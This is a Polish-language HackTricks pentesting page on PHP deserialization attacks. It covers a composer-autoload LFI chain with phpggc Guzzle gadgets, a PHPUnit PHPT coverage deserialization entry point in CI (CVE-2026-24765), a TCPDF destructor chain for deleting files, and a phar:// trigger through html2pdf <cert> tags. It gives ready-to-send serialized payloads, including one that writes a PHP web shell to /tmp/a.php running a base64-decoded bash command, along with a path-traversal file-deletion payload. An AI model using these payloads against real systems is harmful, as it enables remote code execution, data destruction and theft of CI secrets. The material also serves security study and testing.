# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Najpierw powinieneś sprawdzić, czym są [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Jesteśmy w sytuacji, w której znaleziono **PHP deserialization in a webapp** z **brakiem** biblioteki podatnej na gadgety znajdującej się w **`phpggc`**. Jednak w tym samym containerze znajdowała się **different composer webapp with vulnerable libraries**. Dlatego celem było **load the composer loader of the other webapp** i wykorzystać go do **load a gadget that will exploit that library with a gadget** z webapp podatnej na deserializację.

Kroki:

- Znalazłeś **deserialization** i w aktualnym kodzie aplikacji **isn’t any gadget**
- Możesz wykorzystać funkcję **`spl_autoload_register`** jak poniżej, aby **load any local file with `.php` extension**
- Do tego używasz deserializacji, w której nazwa klasy trafi do **`$name`**. Nie możesz użyć "/" ani "." w nazwie klasy w zserializowanym obiekcie, ale **kod** **zamienia** **underscores** ("_") **na slashes** ("/"). Tak więc nazwa klasy taka jak `tmp_passwd` zostanie przekształcona w `/tmp/passwd.php` i kod spróbuje ją załadować.\
A **gadget example** będzie: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Jeśli masz możliwość **przesyłania plików** i możesz załadować plik z **`.php` extension`** możesz **abuse this functionality directly** i uzyskać już RCE.

W moim przypadku nie miałem nic takiego, ale w **tym samym kontenerze** była inna aplikacja webowa używająca composera z **biblioteką podatną na `phpggc` gadget**.

- Aby załadować tę inną bibliotekę, najpierw musisz **załadować composer loader tej drugiej aplikacji webowej** (bo ten z bieżącej aplikacji nie będzie miał dostępu do bibliotek tamtej). **Znając ścieżkę aplikacji**, możesz to bardzo łatwo osiągnąć za pomocą: **`O:28:"www_frontend_vendor_autoload":0:{}`** (W moim przypadku composer loader był w `/www/frontend/vendor/autoload.php`)
- Teraz możesz **load** composer loader tamtej aplikacji, więc czas **`generate the phpgcc`** **payload** do użycia. W moim przypadku użyłem **`Guzzle/FW1`**, który pozwolił mi **`write any file inside the filesystem`**.
- NOTE: Wygenerowany gadget **nie działał**, aby zadziałał **zmodyfikowałem** tamten payload **`chain.php`** z phpggc i ustawiłem **wszystkie atrybuty** klas **z private na public**. Jeśli tego nie zrobiłem, po deserializing the string atrybuty utworzonych obiektów nie miały żadnych wartości.
- Teraz mamy sposób, aby **load** composer loader tamtej aplikacji i mieć działający payload phpggc, ale musimy zrobić to w **SAME REQUEST**, aby loader był załadowany gdy gadżet jest używany. W tym celu wysłałem serializowaną tablicę z oboma obiektami jak:
- Widać najpierw **loader being loaded**, a potem **payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Teraz możemy **utworzyć i zapisać plik**, jednak użytkownik **nie mógł zapisywać w żadnym folderze wewnątrz serwera WWW**. Jak widać w payload, PHP wywołujące **`system`** z jakimś **base64** zostało utworzone w **`/tmp/a.php`**. Następnie możemy **ponownie użyć pierwszego typu payloadu**, którego użyliśmy jako LFI, aby załadować composer loader innego webappu i **załadować wygenerowany `/tmp/a.php`**. Po prostu dodaj to do deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Podsumowanie payloadu**

- **Załaduj composer autoload** innego webapp w tym samym kontenerze
- **Załaduj phpggc gadget** aby wykorzystać bibliotekę z drugiego webappa (początkowy webapp podatny na deserialization nie miał żadnego gadgetu w swoich bibliotekach)
- Gadget **utworzy plik z PHP payloadem** w /tmp/a.php z złośliwymi poleceniami (użytkownik webapp nie może zapisywać w żadnym folderze żadnego webappa)
- Ostateczna część naszego payloadu użyje **wczytania wygenerowanego pliku php**, który wykona polecenia

Musiałem **wywołać tę deserializację dwa razy**. W moich testach, za pierwszym razem plik `/tmp/a.php` został utworzony, ale nie został załadowany, a za drugim razem został poprawnie załadowany.

### Najnowsze dodatki phpggc (2025)

- W **master branch phpggc** wciąż pojawiają się nowe chains: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 i inne wprowadzone w 2025 — przydatne, gdy target app dzieli vendor code z tymi projektami. Szybki sposób wyszukiwania to `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (zaktualizuj najpierw swój clone).
- Przy mieszaniu gadgets pomiędzy aplikacjami przez autoloading pamiętaj, że **private properties w definicjach gadgetów mogą zostać utracone** gdy klasy są redeklarowane inaczej w celu; edytuj gadget’s `chain.php`, aby ustawić właściwości jako `public` jeśli payload przychodzi z pustymi wartościami (ten sam trik pokazany powyżej).

## PHPUnit PHPT coverage deserialization (punkt wejścia CI/CD)

`phpunit` przed **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) deserializował dowolne obiekty PHP z plików `.coverage` generowanych przez **PHPT runner**. W pipeline'ach CI, gdzie niezweryfikowani kontrybutorzy mogą wypychać testy, upuszczenie spreparowanego pliku `.coverage` wyzwala deserializację zaraz po uruchomieniu suite — dostęp przez web nie jest potrzebny.

**Przebieg ataku**

1. Umieść złośliwy plik `.coverage` w repo (lub artifact) zawierający zserializowany gadget obecny w zależnościach testów (np. chain Monolog lub Guzzle z phpggc).
2. Złóż PR; kiedy CI uruchomi `phpunit --configuration phpunit.xml`, PHPT runner odczyta plik coverage i zdeserializuje gadget, dając **RCE wewnątrz kontenera runnera**.
3. To jest szczególnie groźne, gdy testy montują sekrety CI (cloud creds, deployment keys).

**Minimalny złośliwy stub coverage** (umieść obok testu PHPT):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Uruchom PHPT, aby phpunit wykorzystał `exploit.coverage`.

## TCPDF `__destruct` POP chain umożliwiający dowolne usuwanie plików

Kiedy rzeczywista instancja `TCPDF` jest usuwana przez garbage collector, wywołuje `_destroy(true)`, iteruje po `$this->imagekeys` i wywołuje `unlink()` na wszystkim, co wygląda na plik cache w `K_PATH_CACHE`. Jeśli aplikacja wykonuje `unserialize($user_data)` w czasie, gdy klasa `TCPDF` jest załadowana (np. oczekuje tablicy z kluczem `html`), możesz dostarczyć zserializowany obiekt, który ustawia:

- `file_id` na dowolną liczbę całkowitą, która nie występuje w `self::$cleaned_ids` (np. `-1`).
- `imagekeys` na ścieżki zaczynające się od `K_PATH_CACHE` lub które można tak sfałszować (np. `/tmp/../tmp/do_not_delete_this_file.txt` gdy `K_PATH_CACHE` to `/tmp/`).

Przykładowy payload trafiający w niebezpieczny przepływ `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Plik jest usuwany, gdy tylko obiekt wychodzi poza zakres. TCPDF 6.9.3 zaostrzył kontrolę, aby usuwać tylko ścieżki z prefiksem `__tcpdf_<file_id>_` wewnątrz `K_PATH_CACHE` i wprowadził `_unlink()`, aby blokować schematy inne niż `file://`, więc starsze wersje `Producer` są idealnymi celami.

### Wywołanie gadgetu przez `phar://` w tagach html2pdf `<cert>`

`spipu/html2pdf` (≤5.3.0) opakowuje TCPDF i udostępnia niestandardowy blok `<cert>`, którego atrybuty `src`/`privkey` są weryfikowane za pomocą prostego `file_exists()`. Na PHP < 8.0 każda funkcja systemu plików, która dotyka URL `phar://`, powoduje deserializację metadanych Phar. Przechowując powyższy złośliwy obiekt TCPDF wewnątrz archiwum Phar, uzyskujesz niezawodny POP nawet jeśli aplikacja nigdy sama nie wywołuje `unserialize()`.

1. Stwórz Phar z `phar.readonly=0`, ustaw stub/manifest tak, aby wyglądał jak obraz (np. zmień nazwę `archive.phar` na `archive.png`), i umieść zserializowany obiekt TCPDF w metadanych Phar.
2. Wgraj/umieść plik w miejscu dostępnym, np. `/tmp/user_files/user_1/archive.png`.
3. Wyślij HTML zawierający tag `<cert>`, tak aby html2pdf rozwiązał kontrolowaną przez atakującego ścieżkę:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Wywołanie `file_exists()` deserializuje metadane, instancjonuje TCPDF, a jego destruktor usuwa wybrany plik, przekształcając html2pdf w potężny punkt wejścia `phar://`. Wersja 5.3.1 dodała `Security::checkValidPath()`, aby blokować niezatwierdzone schematy, więc przestarzałe wdrożenia pozostają atrakcyjne.

## Referencje

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
